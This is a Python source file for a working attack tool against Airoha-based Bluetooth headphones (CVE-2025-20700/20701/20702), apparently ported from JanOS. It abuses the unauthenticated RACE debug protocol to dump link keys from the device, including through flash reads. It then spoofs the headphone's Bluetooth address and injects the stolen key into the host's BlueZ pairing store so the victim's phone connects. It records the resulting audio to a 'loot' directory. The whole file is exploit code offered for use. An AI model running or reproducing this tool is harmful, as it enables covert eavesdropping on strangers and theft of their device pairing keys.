"""RACE Attack — Airoha BT headphone jacking (CVE-2025-20700/20701/20702).

Ported from JanOS. Exploits unauthenticated RACE debug protocol in
Airoha BT SoCs to extract link keys and hijack audio.
Runs on the uConsole (bleak BLE GATT), does NOT use ESP32 serial.
"""

import asyncio
import os
import re
import struct
import subprocess
import threading
import time
from enum import IntEnum
from pathlib import Path

# ---------------------------------------------------------------------------
# RACE Protocol Constants
# ---------------------------------------------------------------------------

AIROHA_SVC = "5052494d-2dab-0341-6972-6f6861424c45"
AIROHA_TX  = "43484152-2dab-3241-6972-6f6861424c45"
AIROHA_RX  = "43484152-2dab-3141-6972-6f6861424c45"

SONY_SVC = "dc405470-a351-4a59-97d8-2e2e3b207fbb"
SONY_TX  = "bfd869fa-a3f2-4c2f-bcff-3eb1ec80cead"
SONY_RX  = "2a6b6575-faf6-418c-923f-ccd63a56d955"

TRSPX_SVC = "49535343-fe7d-4ae5-8fa9-9fafd205e455"
TRSPX_TX  = "49535343-8841-43f4-a8d4-ecbe34729bb3"
TRSPX_RX  = "49535343-1e4d-4bd9-ba61-23c647249616"

RACE_SVCS = {
    AIROHA_SVC: ("Airoha", AIROHA_TX, AIROHA_RX),
    SONY_SVC:   ("Sony",   SONY_TX,   SONY_RX),
    TRSPX_SVC:  ("TRSPX",  TRSPX_TX,  TRSPX_RX),
}

RACE_HEAD = 0x05

class RaceType(IntEnum):
    CMD = 0x5A
    RESPONSE = 0x5B

class RaceId(IntEnum):
    READ_FLASH_PAGE   = 0x0403
    GET_LINK_KEY      = 0x0CC0
    GET_BD_ADDRESS    = 0x0CD5
    GET_BUILD_VERSION = 0x1E08


# ---------------------------------------------------------------------------
# RACE BLE Client (async)
# ---------------------------------------------------------------------------

class RACEClient:
    def __init__(self):
        self._client = None
        self._tx_uuid = None
        self._rx_uuid = None
        self._vendor = ""
        self._response = None
        self._resp_event = asyncio.Event()
        self._rx_buf = bytearray()
        self._expected = 0

    @property
    def connected(self) -> bool:
        return self._client is not None and self._client.is_connected

    @property
    def vendor(self) -> str:
        return self._vendor

    def _on_notify(self, _sender, data: bytearray):
        self._rx_buf.extend(data)
        if len(self._rx_buf) >= 6 and self._expected == 0:
            _h, _t, length, _cmd = struct.unpack_from("<BBHH", self._rx_buf)
            self._expected = length + 4
        if self._expected > 0 and len(self._rx_buf) >= self._expected:
            self._response = bytes(self._rx_buf[:self._expected])
            self._rx_buf = self._rx_buf[self._expected:]
            self._expected = 0
            self._resp_event.set()

    async def connect(self, address: str):
        from bleak import BleakClient
        self._client = BleakClient(address)
        await self._client.connect()
        for svc in self._client.services:
            uid = svc.uuid.lower()
            if uid in RACE_SVCS:
                self._vendor, self._tx_uuid, self._rx_uuid = RACE_SVCS[uid]
                break
        if not self._tx_uuid:
            await self._client.disconnect()
            self._client = None
            raise RuntimeError("No RACE service found")
        await self._client.start_notify(self._rx_uuid, self._on_notify)

    async def disconnect(self):
        if self._client and self._client.is_connected:
            try:
                await self._client.disconnect()
            except Exception:
                pass
        self._client = None

    async def send_cmd(self, cmd_id: int, payload: bytes = b"",
                       timeout: float = 5.0) -> bytes:
        length = len(payload) + 2
        header = struct.pack("<BBHH", RACE_HEAD, RaceType.CMD, length, cmd_id)
        self._response = None
        self._resp_event.clear()
        self._rx_buf.clear()
        self._expected = 0
        await self._client.write_gatt_char(self._tx_uuid, header + payload, response=True)
        try:
            await asyncio.wait_for(self._resp_event.wait(), timeout)
        except asyncio.TimeoutError:
            raise TimeoutError(f"No response for 0x{cmd_id:04X}")
        return self._response

    async def get_build_version(self) -> str:
        resp = await self.send_cmd(RaceId.GET_BUILD_VERSION)
        return resp[7:].decode("ascii", errors="replace").strip("\x00") if len(resp) > 7 else "?"

    async def get_bd_address(self) -> str:
        resp = await self.send_cmd(RaceId.GET_BD_ADDRESS)
        if len(resp) < 14:
            raise ValueError("Short BD addr response")
        return ":".join(f"{b:02X}" for b in reversed(resp[8:14]))

    async def get_link_keys(self) -> list[tuple[str, bytes]]:
        resp = await self.send_cmd(RaceId.GET_LINK_KEY, timeout=10.0)
        if len(resp) < 9:
            raise ValueError("Short link key response")
        num = resp[7]
        results = []
        off = 9
        for _ in range(num):
            if off + 22 > len(resp):
                break
            bd = resp[off:off+6]
            key = resp[off+6:off+22]
            addr = ":".join(f"{b:02X}" for b in reversed(bd))
            results.append((addr, bytes(key)))
            off += 22
        return results

    async def read_flash_page(self, address: int) -> bytes:
        payload = struct.pack("<BBI", 0x00, 0x00, address)
        resp = await self.send_cmd(RaceId.READ_FLASH_PAGE, payload, timeout=10.0)
        if len(resp) < 14:
            raise ValueError("Short flash response")
        return resp[14:]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _spoof_bt_address(target_mac: str, adapter: str = "hci0") -> bool:
    os.system("systemctl stop bluetooth 2>/dev/null")
    time.sleep(1)
    ret = os.system(f"bdaddr -i {adapter} {target_mac} 2>/dev/null")
    if ret != 0:
        ret = os.system(f"btmgmt --index 0 public-addr {target_mac} 2>/dev/null")
    os.system(f"hciconfig {adapter} up 2>/dev/null")
    time.sleep(1)
    os.system("systemctl start bluetooth 2>/dev/null")
    time.sleep(2)
    os.system(f"hciconfig {adapter} class 0x200418 2>/dev/null")
    os.system(f"hciconfig {adapter} piscan 2>/dev/null")
    return ret == 0


def _inject_link_key(adapter_mac: str, phone_mac: str,
                     link_key: bytes, name: str = "Headphones") -> bool:
    bt_dir = Path(f"/var/lib/bluetooth/{adapter_mac.upper()}/{phone_mac.upper()}")
    bt_dir.mkdir(parents=True, exist_ok=True)
    key_hex = link_key.hex().upper()
    info = (f"[LinkKey]\nKey={key_hex}\nType=4\nPINLength=0\n\n"
            f"[General]\nName={name}\nTrusted=true\nBlocked=false\n")
    (bt_dir / "info").write_text(info)
    os.system("systemctl restart bluetooth 2>/dev/null")
    time.sleep(2)
    return True


def _get_adapter_mac(adapter: str = "hci0") -> str:
    try:
        out = subprocess.check_output(["hciconfig", adapter], text=True,
                                      stderr=subprocess.DEVNULL)
        m = re.search(r'BD Address:\s+([0-9A-F:]{17})', out, re.IGNORECASE)
        return m.group(1).upper() if m else ""
    except Exception:
        return ""


def _find_bt_audio_source() -> str | None:
    try:
        out = subprocess.check_output(["pactl", "list", "sources", "short"],
                                      text=True, stderr=subprocess.DEVNULL)
        for line in out.splitlines():
            if "bluez" in line.lower():
                return line.split()[1]
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# RACE Attack
# ---------------------------------------------------------------------------

class RACEAttack:
    """RACE Airoha headphone jacking — headless (no urwid)."""

    def __init__(self, msg_fn=None, loot=None):
        self._msg = msg_fn or (lambda *a: None)
        self._loot = loot
        self._running = False
        self._thread: threading.Thread | None = None
        self._loop: asyncio.AbstractEventLoop | None = None
        self.scanned: list[dict] = []
        self.target_addr = ""
        self.target_name = ""
        self.headphone_mac = ""
        self.link_keys: list[tuple[str, bytes]] = []
        self.hijacked = False
        self._audio_proc: subprocess.Popen | None = None
        self._audio_file = ""

    @property
    def running(self) -> bool:
        return self._running

    def _run_async(self, coro_fn, *args):
        def _thread():
            loop = asyncio.new_event_loop()
            self._loop = loop
            try:
                loop.run_until_complete(coro_fn(*args))
            except Exception as e:
                self._msg(f"[RACE] Error: {e}")
            finally:
                loop.close()
                self._loop = None
                self._running = False
        self._running = True
        self._thread = threading.Thread(target=_thread, daemon=True)
        self._thread.start()

    def scan(self) -> None:
        self._msg("[RACE] BLE scan (looking for RACE)...")

        async def _scan():
            try:
                from bleak import BleakScanner
                devices = await BleakScanner.discover(timeout=8.0, return_adv=True)
                results = []
                race_uuids = set(RACE_SVCS.keys())
                for dev, adv in devices.values():
                    svc_uuids = set(u.lower() for u in (adv.service_uuids or []))
                    results.append({
                        "addr": dev.address,
                        "name": adv.local_name or dev.name or "",
                        "rssi": adv.rssi or -999,
                        "race": bool(svc_uuids & race_uuids),
                    })
                results.sort(key=lambda d: (not d["race"], -d["rssi"]))
                self.scanned = results
                race_n = sum(1 for d in results if d["race"])
                self._msg(f"[RACE] {len(results)} devices ({race_n} RACE)")
                for i, d in enumerate(results[:15]):
                    tag = " [RACE!]" if d["race"] else ""
                    self._msg(f"  {i+1}. {d['addr']} {d['rssi']}dBm {d['name']}{tag}")
            except ImportError:
                self._msg("[RACE] ERROR: 'bleak' not installed")
            except Exception as e:
                self._msg(f"[RACE] Scan error: {e}")

        self._run_async(_scan)

    def check(self, addr: str, name: str = "") -> None:
        self.target_addr = addr
        self.target_name = name or addr
        self._msg(f"[RACE] Checking {addr}...")

        async def _check():
            client = RACEClient()
            try:
                await client.connect(addr)
                self._msg(f"[RACE] VULNERABLE! Vendor: {client.vendor}")
                try:
                    ver = await client.get_build_version()
                    self._msg(f"[RACE] Firmware: {ver}")
                except Exception:
                    pass
                try:
                    bd = await client.get_bd_address()
                    self.headphone_mac = bd
                    self._msg(f"[RACE] Classic BT: {bd}")
                except Exception:
                    pass
                try:
                    keys = await client.get_link_keys()
                    if keys:
                        self.link_keys = keys
                        self._msg(f"[RACE] {len(keys)} link key(s) found!")
                        for ka, kv in keys:
                            self._msg(f"  {ka} -> {kv.hex()}")
                    else:
                        self._msg("[RACE] No link keys (try [e] flash dump)")
                except Exception as e:
                    self._msg(f"[RACE] Keys: {e}")
                if self._loot:
                    self._loot.log_attack_event(
                        f"RACE: Vuln {addr} bd={self.headphone_mac} keys={len(self.link_keys)}")
            except RuntimeError as e:
                self._msg(f"[RACE] Not vulnerable: {e}")
            except Exception as e:
                self._msg(f"[RACE] Error: {e}")
            finally:
                await client.disconnect()

        self._run_async(_check)

    def extract(self) -> None:
        if not self.target_addr:
            self._msg("[RACE] Select device first ([s] scan)")
            return
        self._msg(f"[RACE] Extracting from {self.target_addr}...")

        async def _extract():
            client = RACEClient()
            try:
                await client.connect(self.target_addr)
                # Try direct
                try:
                    keys = await client.get_link_keys()
                    if keys:
                        self.link_keys = keys
                        self._msg(f"[RACE] Direct: {len(keys)} key(s)")
                        return
                except Exception:
                    pass
                try:
                    bd = await client.get_bd_address()
                    self.headphone_mac = bd
                except Exception:
                    pass
                # Flash dump
                self._msg("[RACE] Scanning flash (may take 60s)...")
                found = []
                base = 0x08000000
                for page in range(256):
                    if not self._running:
                        break
                    try:
                        data = await client.read_flash_page(base + page * 0x100)
                        for off in range(0, len(data) - 22):
                            mb = data[off:off+6]
                            kb = data[off+6:off+22]
                            if (mb != b'\x00'*6 and mb != b'\xff'*6 and
                                kb != b'\x00'*16 and kb != b'\xff'*16 and
                                mb[0] & 0x01 == 0):
                                ms = ":".join(f"{b:02X}" for b in reversed(mb))
                                if not any(m == ms for m, _ in found):
                                    found.append((ms, bytes(kb)))
                    except Exception:
                        continue
                    if page % 32 == 0:
                        self._msg(f"[RACE] Flash: {page}/256...")
                if found:
                    self.link_keys = found
                    self._msg(f"[RACE] Found {len(found)} key(s) in flash")
                else:
                    self._msg("[RACE] No keys in flash")
            except Exception as e:
                self._msg(f"[RACE] Extract error: {e}")
            finally:
                await client.disconnect()

        self._run_async(_extract)

    def hijack(self, key_idx: int = 0) -> None:
        if not self.link_keys:
            self._msg("[RACE] No keys — run check/extract first")
            return
        if key_idx >= len(self.link_keys):
            key_idx = 0
        phone_mac, link_key = self.link_keys[key_idx]
        hp_mac = self.headphone_mac
        self._msg(f"[RACE] Hijacking as {hp_mac}...")
        self._running = True

        def _hijack():
            try:
                self._msg("[RACE] 1/3 Spoofing MAC...")
                _spoof_bt_address(hp_mac)
                self._msg("[RACE] 2/3 Injecting link key...")
                adapter_mac = _get_adapter_mac() or hp_mac
                _inject_link_key(adapter_mac, phone_mac, link_key,
                                 self.target_name or "Headphones")
                self._msg("[RACE] 3/3 Waiting for phone...")
                self.hijacked = True
                self._msg("[RACE] Hijack ready — phone should auto-connect")
                if self._loot:
                    self._loot.log_attack_event(
                        f"RACE: Hijack {hp_mac} -> {phone_mac}")
            except Exception as e:
                self._msg(f"[RACE] Hijack error: {e}")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_hijack, daemon=True)
        self._thread.start()

    def listen(self) -> None:
        if not self.hijacked:
            self._msg("[RACE] Hijack first")
            return
        self._msg("[RACE] Looking for BT audio...")
        self._running = True

        def _listen():
            try:
                source = None
                for i in range(30):
                    if not self._running:
                        return
                    source = _find_bt_audio_source()
                    if source:
                        break
                    if i % 5 == 0:
                        self._msg(f"[RACE] Waiting audio ({i}/30)...")
                    time.sleep(2)
                if not source:
                    self._msg("[RACE] No BT audio found")
                    return
                ts = time.strftime("%Y%m%d_%H%M%S")
                if self._loot:
                    loot_dir = Path(self._loot.session_path)
                else:
                    loot_dir = Path.home() / "loot"
                loot_dir.mkdir(parents=True, exist_ok=True)
                self._audio_file = str(loot_dir / f"bt_audio_{ts}.wav")
                try:
                    self._audio_proc = subprocess.Popen(
                        ["parecord", "--device", source,
                         "--format=s16le", "--rate=44100", "--channels=2",
                         self._audio_file],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    self._msg(f"[RACE] RECORDING -> {self._audio_file}")
                except Exception as e:
                    self._msg(f"[RACE] Record failed: {e}")
            except Exception as e:
                self._msg(f"[RACE] Listen error: {e}")
            finally:
                self._running = False

        self._thread = threading.Thread(target=_listen, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._running = False
        if self._audio_proc:
            try:
                self._audio_proc.terminate()
                self._audio_proc.wait(timeout=3)
            except Exception:
                pass
            self._audio_proc = None
            if self._audio_file:
                self._msg(f"[RACE] Audio saved: {self._audio_file}")
        os.system("systemctl start bluetooth 2>/dev/null")
        self.hijacked = False
        self.link_keys.clear()
        self.headphone_mac = ""
        self._msg("[RACE] Stopped")
